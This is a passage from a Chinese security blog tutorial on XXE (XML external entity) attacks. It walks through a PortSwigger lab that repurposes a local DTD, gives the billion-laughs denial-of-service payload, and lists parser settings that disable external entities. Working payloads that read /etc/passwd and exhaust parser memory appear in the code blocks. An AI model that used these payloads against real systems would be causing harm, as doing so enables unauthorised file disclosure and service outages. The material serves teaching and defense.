+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">"and</span> <span class="token attr-name">|</span> <span class="token attr-name">or</span> <span class="token attr-name">|</span> <span class="token attr-name">not</span> <span class="token attr-name">|</span> <span class="token attr-name">equal</span> <span class="token attr-name">|</span> <span class="token attr-name">contains</span> <span class="token attr-name">|</span> <span class="token attr-name">exists</span> <span class="token attr-name">|</span> <span class="token attr-name">subdomain-of"</span><span class="token punctuation">></span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">pattern</span> <span class="token attr-name">(%condition;)</span><span class="token punctuation">></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>构造 payload</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">
+    &lt;!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">'aaa)</span><span class="token punctuation">></span></span>
+        &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> file SYSTEM "file:///etc/passwd">
+        &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> eval "&lt;!ENTITY <span class="token entity" title="&#x26;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="&#x27;">&amp;#x27;</span>file:///nonexistent/<span class="token entity" title="&#x25;">&amp;#x25;</span>file;<span class="token entity" title="&#x27;">&amp;#x27;</span>>">
+        <span class="token entity" title="&#x25;">&amp;#x25;</span>eval;
+        <span class="token entity" title="&#x25;">&amp;#x25;</span>error;
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">aa</span> <span class="token attr-name">(bb'</span><span class="token punctuation">></span></span>
+    %local_dtd;
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这样依赖，我们在调用 <code>&amp;local_dtd</code> 的时候，会对 condition 实体进行引用，接着会将 condition 内容替换进来。在复用本地 DTD 文件之后，可以重新定义该文件中的一些参数实体引用；从而进一步构造 payload。</p>
+<blockquote>
+<p>这么干讲还是有点太抽象了，我们看一道靶场体验一下。</p>
+</blockquote>
+<blockquote>
+<h5 id="Lab-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD"><a href="#Lab-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD" class="headerlink" title="Lab: Exploiting XXE to retrieve data by repurposing a local DTD"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd">Lab: Exploiting XXE to retrieve data by repurposing a local DTD</a></h5></blockquote>
+<ul>
+<li>题目要求我们获得 &#x2F;etc&#x2F;passwd 的内容，并且告诉了我们本地 DTD 的路径；以及实体类的名称。</li>
+</ul>
+<p>直接构造 payload</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> 
+<span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
+&lt;!ENTITY % ISOamso ' 
+&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> file SYSTEM "file:///etc/passwd"> &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> eval "
+&lt;!ENTITY <span class="token entity" title="&#x26;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="&#x27;">&amp;#x27;</span>file:///nonexistent/<span class="token entity" title="&#x25;">&amp;#x25;</span>file;<span class="token entity" title="&#x27;">&amp;#x27;</span>>"> <span class="token entity" title="&#x25;">&amp;#x25;</span>eval;
+<span class="token entity" title="&#x25;">&amp;#x25;</span>error; '> 
+%local_dtd; </span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>剖析 payload</p>
+<p>这里我们调用了本地的 dockbookx.dtd，在调用本地的 dockbookx.dtd 的同时，复写了 ISOamso 这一实体类，ISOamso 被调用的时候就执行了我们的恶意命令，从而达到读取文件的效果。</p>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/XXEUseLocalDTD.png" class="">
+
+<h3 id="7-XXE-造成的-DOS"><a href="#7-XXE-造成的-DOS" class="headerlink" title="7. XXE 造成的 DOS"></a>7. XXE 造成的 DOS</h3><ul>
+<li>payload 比较简单</li>
+</ul>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">lolz</span> <span class="token punctuation">[</span><span class="token internal-subset">
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol</span> <span class="token attr-name">"lol"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">lolz</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol1</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里我们访问了 <code>&amp;lol9</code> 这一实体类，而 <code>&amp;lol9</code> 调用了 11 个 <code>%lol8</code>，<code>&amp;lol8</code> 又调用了很多个 <code>&amp;lol7</code>，以此类推，从而造成 DOS。</p>
+<h2 id="0x05-XXE-漏洞的防御"><a href="#0x05-XXE-漏洞的防御" class="headerlink" title="0x05 XXE 漏洞的防御"></a>0x05 XXE 漏洞的防御</h2><h3 id="禁用外部实体"><a href="#禁用外部实体" class="headerlink" title="禁用外部实体"></a>禁用外部实体</h3><p>这种方式在不同语言中不一样</p>
+<p><strong>PHP</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>JAVA</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">DocumentBuilderFactory</span> dbf <span class="token operator">=</span><span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://apache.org/xml/features/disallow-doctype-decl"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-general-entities"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://xml.org/sax/features/external-parameter-entities"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>Python</strong></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
+xmlData <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>xmlSource<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ul>
+<li>禁用外部实体是防御 XXE 最有效的方式</li>
+</ul>
+<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/106330095">https://blog.csdn.net/qq_38154820/article/details/106330095</a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">从0到1完全掌握XXE</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2022-04-19 15:08:09</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2022/04/19/从0到1完全掌握XXE/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E4%BB%8E0%E5%88%B01/">#从0到1</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/04/24/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-06-%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">WebGoat代码审计-06-有缺陷的访问控制</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">WebGoat代码审计-05-XXE注入</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE"><span class="nav-text">从0到1完全掌握XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-XML-%E5%AE%9A%E4%B9%89%E5%AE%9E%E4%BD%93"><span class="nav-text">0x01 前置知识 XML 定义实体</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E4%BB%80%E4%B9%88%E6%98%AF-XXE"><span class="nav-text">0x02 什么是 XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-XXE-%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-text">0x03 XXE 的危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-XXE-%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0"><span class="nav-text">0x04 XXE 几种攻击方式学习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%80%9A%E8%BF%87-File-%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-text">1. 通过 File 协议进行文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Exploiting-XXE-using-external-entities-to-retrieve-files"><span class="nav-text">Lab: Exploiting XXE using external entities to retrieve files</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-XXE-%E7%9B%B2%E6%B3%A8"><span class="nav-text">2. XXE 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%9F%BA%E6%9C%AC%E7%9B%B2%E6%B3%A8"><span class="nav-text">(1) 基本盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities"><span class="nav-text">Lab: Blind XXE with out-of-band interaction via XML parameter entities</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%A4%9A%E4%B8%AA-DTD-%E7%9A%84%E8%B0%83%E7%94%A8%E6%94%BB%E5%87%BB"><span class="nav-text">(2) 多个 DTD 的调用攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD"><span class="nav-text">Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%8A%A5%E9%94%99%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="nav-text">(3) 报错型盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Exploiting-blind-XXE-to-retrieve-data-via-error-messages"><span class="nav-text">Lab: Exploiting blind XXE to retrieve data via error messages</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%88%A9%E7%94%A8-XXE-%E6%89%A7%E8%A1%8C-SSRF"><span class="nav-text">3. 利用 XXE 执行 SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B9%A6%E8%AF%B4%E4%B8%8A%E6%96%87%E7%9A%84-file-%E5%8D%8F%E8%AE%AE"><span class="nav-text">书说上文的 file 协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">新的利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E7%BD%91-IP-%E7%88%86%E7%A0%B4"><span class="nav-text">内网 IP 爆破</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4"><span class="nav-text">内网端口爆破</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%EF%BC%9ALab-Exploiting-XXE-to-perform-SSRF-attacks"><span class="nav-text">靶场：Lab: Exploiting XXE to perform SSRF attacks</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-XXE-%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%93%E5%90%88"><span class="nav-text">4. XXE 与文件上传结合</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8-svg-%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87"><span class="nav-text">(1) 使用 svg 上传图片</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Exploiting-XXE-via-image-file-upload"><span class="nav-text">Lab: Exploiting XXE via image file upload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8-jar-x2F-x2F-%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%94%BB%E5%87%BB"><span class="nav-text">(2) 利用 jar:&#x2F;&#x2F; 协议的攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%88%A9%E7%94%A8-XInclude-%E6%94%BB%E5%87%BB"><span class="nav-text">5. 利用 XInclude 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Exploiting-XInclude-to-retrieve-files"><span class="nav-text">Lab: Exploiting XInclude to retrieve files</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E5%88%AB%E6%A0%B7%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%8C%E5%A4%8D%E7%94%A8%E6%9C%AC%E5%9C%B0-DTD"><span class="nav-text">6. 别样的利用方式，复用本地 DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD"><span class="nav-text">Lab: Exploiting XXE to retrieve data by repurposing a local DTD</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-XXE-%E9%80%A0%E6%88%90%E7%9A%84-DOS"><span class="nav-text">7. XXE 造成的 DOS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-XXE-%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="nav-text">0x05 XXE 漏洞的防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A6%81%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-text">禁用外部实体</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">0x06 参考资料</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
